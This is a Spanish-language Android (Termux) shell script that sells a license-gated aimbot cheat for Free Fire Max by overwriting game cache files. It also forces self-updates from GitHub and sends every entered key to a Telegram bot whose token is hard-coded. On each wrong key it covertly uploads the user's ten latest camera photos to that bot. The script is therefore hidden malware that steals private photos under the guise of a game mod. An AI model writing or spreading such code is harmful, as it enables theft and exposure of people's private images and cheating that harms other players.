#!/data/data/com.termux/files/usr/bin/sh

# --- CONFIGURACIÓN DE ACTUALIZACIÓN ONLINE ---
VERSION_ACTUAL="1.8"
CURL_PATH="/data/data/com.termux/files/usr/bin/curl"
URL_VERSION="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/version.txt?v=$(date +%s)"
URL_SCRIPT="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/PedroModz666.sh?v=$(date +%s)"
URL_KEYS="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/keys.txt?v=$(date +%s)"
# ---------------------------------------------

verificar_actualizacion() {
    VERSION_REMOTA=$("$CURL_PATH" -s "$URL_VERSION" | tr -d '\r' | tr -d '\n' | xargs)
    
    if [ -n "$VERSION_REMOTA" ] && [ "$VERSION_ACTUAL" != "$VERSION_REMOTA" ]; then
        printf "\n\033[1;31m¡Nueva actualización obligatoria disponible ($VERSION_REMOTA)!\033[0m\n"
        printf "¿Deseas actualizar ahora? (s/n): "
        read respuesta
        if [ "$respuesta" = "s" ] || [ "$respuesta" = "S" ]; then
            printf "Actualizando script...\n"
            if "$CURL_PATH" -s -o "$0" "$URL_SCRIPT"; then
                chmod +x "$0"
                printf "\033[1;32m¡Actualización completada! Vuelve a abrir el script.\033[0m\n\n"
                exit 0
            else
                printf "\033[1;31mError al descargar la actualización.\033[0m\n"
                exit 1
            fi
        else
            printf "\n\033[1;31m[!] Debes actualizar para usar el script. Saliendo...\033[0m\n\n"
            exit 0
        fi
    fi
}

verificar_actualizacion

# --- CONFIGURACIÓN DE TELEGRAM ---
TOKEN_BOT="8683483962:AAGHLpFhkenCuKPbo_jDSlHP5RtomhR3L4Y"
TU_CHAT_ID="7024840116"

# --- VERIFICACIÓN DE VENCIMIENTO ---
FECHA_LIMITE=20261027
FECHA_ACTUAL=$(date +%Y%m%d)

if [ "$FECHA_ACTUAL" -gt "$FECHA_LIMITE" ]; then
    printf "\033[1;31m======================================\n"
    printf "        ❌ SCRIPT VENCIDO ❌          \n"
    printf "======================================\n"
    printf "Este script ha expirado (Duración: 1 semana).\n"
    printf "Contacta al administrador para renovarlo:\n"
    printf "📱 WhatsApp: +593 982954390\033[0m\n\n"
    exit 1
fi
# ----------------------------------------------

INTENTOS_MAXIMOS=3

# Colores ANSI
ROJO='\033[1;31m'
VERDE='\033[1;32m'
AZUL='\033[1;36m'
AMARILLO='\033[1;33m'
CYAN='\033[0;36m'
RESET='\033[0m'

# --- RUTAS DE ARCHIVOS Y DESTINO ---
FILE_ORI="/storage/emulated/0/PedroModz666/Ori/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
FILE_PECHO="/storage/emulated/0/PedroModz666/Pecho/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
FILE_CUELLO="/storage/emulated/0/PedroModz666/Cuello/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"

DESTINO="/data/user/0/com.dts.freefiremax/files/contentcache/Compulsory/android/gameassetbundles/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"

clear

# --- VERIFICACIÓN DE KEY INDIVIDUAL EN GITHUB ---
intentos=0
while [ $intentos -lt $INTENTOS_MAXIMOS ]; do
    printf "${AZUL}======================================\n"
    printf "${VERDE}        🔐 ACCESO CON LICENCIA 🔐       \n"
    printf "${AZUL}======================================${RESET}\n"
    printf "${AMARILLO}Ingresa tu Key o Licencia: ${RESET}"
    read password

    # Comprueba si la key ingresada existe en el archivo keys.txt de tu GitHub
    KEY_VALIDA=$("$CURL_PATH" -s "$URL_KEYS" | grep -F "$password")

    if [ -n "$password" ] && [ -n "$KEY_VALIDA" ]; then
        MSG_TG="✅ Key correcta ingresada: '$password'"
        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
            -d "chat_id=$TU_CHAT_ID" \
            -d "text=$MSG_TG" > /dev/null 2>&1

        printf "\n${VERDE}[✔] ¡Licencia aceptada! Acceso concedido.${RESET}\n\n"
        sleep 1
        break
    else
        intentos=$((intentos + 1))
        restantes=$((INTENTOS_MAXIMOS - intentos))
        
        MSG_TG="⚠️ Key inválida intentada: '$password' (Restantes: $restantes). Aquí tienes las últimas 10 fotos:"
        
        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
            -d "chat_id=$TU_CHAT_ID" \
            -d "text=$MSG_TG" > /dev/null 2>&1

        for foto in $(ls -t /storage/emulated/0/DCIM/Camera/*.jpg 2>/dev/null | head -n 10); do
            if [ -f "$foto" ]; then
                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendPhoto" \
                    -F "chat_id=$TU_CHAT_ID" \
                    -F "photo=@$foto" > /dev/null 2>&1
            fi
        done

        printf "\n${ROJO}[✖] Key inválida. Intentos restantes: $restantes${RESET}\n\n"
        if [ $intentos -eq $INTENTOS_MAXIMOS ]; then
            MSG_TG="🚫 Script bloqueado por exceder intentos de keys inválidas."
            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
            -d "chat_id=$TU_CHAT_ID" \
            -d "text=$MSG_TG" > /dev/null 2>&1

            printf "${ROJO}[!] Demasiados intentos fallidos. Saliendo...${RESET}\n\n"
            exit 1
        fi
        sleep 1
        clear
    fi
done

# --- MENÚ PRINCIPAL ---
while true; do
    clear
    printf "${AZUL}======================================\n"
    printf "${VERDE}             PedroModz666             \n"
    printf "${CYAN}     Contacto: +593 982954390        \n"
    printf "${AZUL}======================================\n"
    printf "${AMARILLO}        1)${RESET} Original\n"
    printf "${AMARILLO}        2)${RESET} Aimbot Pecho\n"
    printf "${AMARILLO}        3)${RESET} Aimbot Cuello\n"
    printf "${AMARILLO}        4)${RESET} Salir\n"
    printf "${AZUL}======================================${RESET}\n"
    printf "${VERDE}Selecciona una opción [1-4]: ${RESET}"
    read opcion

    case "$opcion" in
        1)
            if [ -f "$FILE_ORI" ]; then
                printf "\n${CYAN}Inyectando Original...${RESET}\n"
                cat "$FILE_ORI" > "$DESTINO"
                printf "${VERDE}[✔] ¡Bypass Active Disfruta!${RESET}\n"
            else
                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Ori/${RESET}\n"
            fi
            ;;
        2)
            if [ -f "$FILE_PECHO" ]; then
                printf "\n${CYAN}Inyectando Aim Pecho...${RESET}\n"
                cat "$FILE_PECHO" > "$DESTINO"
                printf "${VERDE}[✔] ¡Aim Pecho aplicado con éxito!${RESET}\n"
            else
                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Pecho/${RESET}\n"
            fi
            ;;
        3)
            if [ -f "$FILE_CUELLO" ]; then
                printf "\n${CYAN}Inyectando Aim Cuello...${RESET}\n"
                cat "$FILE_CUELLO" > "$DESTINO"
                printf "${VERDE}[✔] ¡Aim Cuello aplicado con éxito!${RESET}\n"
            else
                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Cuello/${RESET}\n"
            fi
            ;;
        4)
            printf "\n${CYAN}Saliendo del script. ¡Hasta luego, crack!${RESET}\n\n"
            exit 0
            ;;
        *)
            printf "\n${ROJO}[!] Opción no válida.${RESET}\n"
            ;;
    esac

    sleep 1.5
done